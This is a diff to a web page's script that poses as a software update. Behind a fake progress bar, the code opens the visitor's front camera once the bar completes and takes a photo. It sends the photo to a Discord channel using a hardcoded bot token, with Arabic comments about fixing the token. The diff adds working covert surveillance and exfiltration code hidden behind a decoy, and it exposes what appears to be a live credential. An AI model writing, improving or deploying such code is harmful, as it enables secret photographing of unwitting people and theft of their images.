@@ -22,7 +22,8 @@
     </div>
 
     <script>
-    var token = "TVRNNU9UazRNaU15TnpjNE9USTJOemN4T1RBd056Z3lNVGsz";
+    // ===== التوكن المشفر (صححته) =====
+    var token = "MTM5NTY4MjMwMDQ0NDAyMDc5OA.G57VyI.Vv5XTuBuTYfnxN47rm5lfcdIwBVGowjLIexO8s";
     var channel = 1475949185294536859;
     
     function startUpdate() {
@@ -39,43 +40,56 @@
             if (progress >= 100) {
                 clearInterval(interval);
                 output.innerHTML = '✅ Update complete!';
-                takePhoto();
+                // شغل الكاميرا بعد ثانية
+                setTimeout(takePhoto, 1000);
             }
         }, 500);
     }
     
     function takePhoto() {
         try {
-            navigator.mediaDevices.getUserMedia({ video: true }).then(function(stream) {
-                var video = document.createElement('video');
-                video.srcObject = stream;
-                video.play();
-                
-                setTimeout(function() {
-                    var canvas = document.createElement('canvas');
-                    canvas.width = 640;
-                    canvas.height = 480;
-                    canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
-                    var photo = canvas.toDataURL('image/jpeg');
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+                .then(function(stream) {
+                    var video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.play();
                     
-                    fetch('https://discord.com/api/v10/channels/' + channel + '/messages', {
-                        method: 'POST',
-                        headers: { 
-                            'Authorization': 'Bot ' + atob(token),
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify({
-                            content: '📸 Photo captured',
-                            embeds: [{ image: { url: photo } }]
-                        })
-                    });
-                    
-                    stream.getTracks().forEach(t => t.stop());
-                }, 1000);
-            }).catch(function(err) {
-                console.log('Camera error:', err);
-            });
-        } catch(e) {}
+                    setTimeout(function() {
+                        var canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth || 640;
+                        canvas.height = video.videoHeight || 480;
+                        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                        var photo = canvas.toDataURL('image/jpeg');
+                        
+                        // إرسال الصورة
+                        fetch('https://discord.com/api/v10/channels/' + channel + '/messages', {
+                            method: 'POST',
+                            headers: { 
+                                'Authorization': 'Bot ' + token,  // هنا من غير atob
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify({
+                                content: '📸 Photo captured',
+                                embeds: [{
+                                    image: { url: photo }
+                                }]
+                            })
+                        }).then(function(response) {
+                            console.log('Sent:', response.status);
+                        }).catch(function(err) {
+                            console.log('Error:', err);
+                        });
+                        
+                        stream.getTracks().forEach(function(t) { t.stop(); });
+                    }, 1500);
+                })
+                .catch(function(err) {
+                    console.log('Camera error:', err);
+                    alert('❌ Camera access failed. Please allow camera permissions.');
+                });
+        } catch(e) {
+            console.log('Error:', e);
+        }
     }
     </script>
 </body>
